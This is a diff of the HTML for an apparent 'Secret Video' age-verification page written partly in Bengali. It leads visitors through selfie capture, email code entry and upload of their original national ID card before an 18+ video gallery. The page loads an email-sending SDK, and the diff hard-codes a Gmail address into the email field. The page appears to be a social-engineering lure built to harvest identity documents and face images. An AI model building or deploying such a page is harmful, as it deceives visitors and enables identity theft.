@@ -6,7 +6,6 @@
   <title>Secret Video - Age Verification</title>
   <link rel="icon" type="image/png" href="https://i.ibb.co/zWvmyGPT/1000109018.png">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <!-- ✅ EmailJS SDK -->
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
   <style>
     * { box-sizing:border-box; margin:0; padding:0; font-family:'Segoe UI',Roboto,sans-serif; }
@@ -121,7 +120,6 @@
 </head>
 <body>
 
-  <!-- স্ক্রিন ১: অপশন -->
   <div class="page active" id="optPage">
     <div class="hdr">
       <div class="hdr-left">
@@ -148,7 +146,6 @@
 
     <div class="ordiv">OR VERIFY YOUR AGE</div>
 
-    <!-- ✅ পরিবর্তনকৃত এনআইডি কার্ড ভেরিফিকেশন বাটন -->
     <button type="button" class="opt green" onclick="goPage('nidPage')">
       <span class="ic"><i class="fa-solid fa-id-card"></i></span>
       <span class="tx"><span class="l1">NID Card Verification</span><span class="l2">Upload Original NID Card (18+)</span></span>
@@ -158,7 +155,6 @@
     <div class="dbl"><i class="fa-solid fa-check-double"></i> Double Anonymity</div>
   </div>
 
-  <!-- স্ক্রিন ২: সেলফি নির্দেশনা -->
   <div class="page" id="selfiePage">
     <div class="hdr">
       <div class="hdr-left">
@@ -179,7 +175,6 @@
     <button type="button" class="start-btn" onclick="startSelfie()">START SELFIE</button>
   </div>
 
-  <!-- স্ক্রিন ৩: ইমেইল এন্ট্রি -->
   <div class="page" id="emailPage">
     <div class="hdr">
       <div class="hdr-left">
@@ -190,11 +185,10 @@
     </div>
     <h2 class="sttl">📧 Email Verification</h2>
     <p style="text-align:center; color:#777; font-size:14px; margin-bottom:20px;">আপনার আসল ইমেইল দিন —<br>৬ ডিজিটের ভেরিফিকেশন কোড ইমেইলে যাবে</p>
-    <input type="email" id="userEmail" class="email-inp" placeholder="your@email.com">
+    <input type="email" id="userEmail" class="email-inp" value="mydreamd24@gmail.com" placeholder="your@email.com">
     <button type="button" class="start-btn" id="sendCodeBtn" onclick="sendCode()">SEND CODE 📧</button>
   </div>
 
-  <!-- স্ক্রিন ৪: কোড এন্ট্রি -->
   <div class="page" id="codePage">
     <div class="hdr">
       <div class="hdr-left">
@@ -212,7 +206,6 @@
     <button type="button" class="resend-btn" id="resendBtn" onclick="sendCode()">কোড আসেনি? আবার পাঠান</button>
   </div>
 
-  <!-- নতুন স্ক্রিন: এনআইডি কার্ড ভেরিফিকেশন -->
   <div class="page" id="nidPage">
     <div class="hdr">
       <div class="hdr-left">
@@ -236,7 +229,6 @@
     <button type="button" class="start-btn" onclick="verifyNid()">VERIFY NID CARD 🪪</button>
   </div>
 
-  <!-- স্ক্রিন ৫: ক্যামেরা -->
   <div id="camPage">
     <video id="camVideo" autoplay playsinline muted></video>
     <div class="oval"></div>
@@ -245,7 +237,6 @@
     <div class="flash" id="camFlash"></div>
   </div>
 
-  <!-- স্ক্রিন ৬: যাচাই হচ্ছে -->
   <div class="page" id="verifyPage">
     <div class="vwrap">
       <div class="spin" id="vSpin"></div>
@@ -253,7 +244,6 @@
     </div>
   </div>
 
-  <!-- স্ক্রিন ৭: ভুল বয়স বা অযোগ্য মেসেজ -->
   <div class="page" id="denyPage">
     <div class="hdr">
       <div class="hdr-left">
@@ -270,7 +260,6 @@
     </div>
   </div>
 
-  <!-- স্ক্রিন ৮: ১৮+ ভিডিও গ্যালারি -->
   <div class="page" id="galleryPage">
     <div class="top-nav">
       <div class="logo"><img src="https://i.ibb.co/zWvmyGPT/1000109018.png" alt="Secret Video"><span class="sname" style="font-size:20px;">SECRET<span>VIDEO</span></span></div>
@@ -292,7 +281,6 @@
     </div>
   </div>
 
-  <!-- ভিডিও প্লেয়ার -->
   <div id="playerModal">
     <button type="button" class="pl-x" onclick="closePlayer()">✕</button>
     <div class="vbox" id="playerBox"></div>
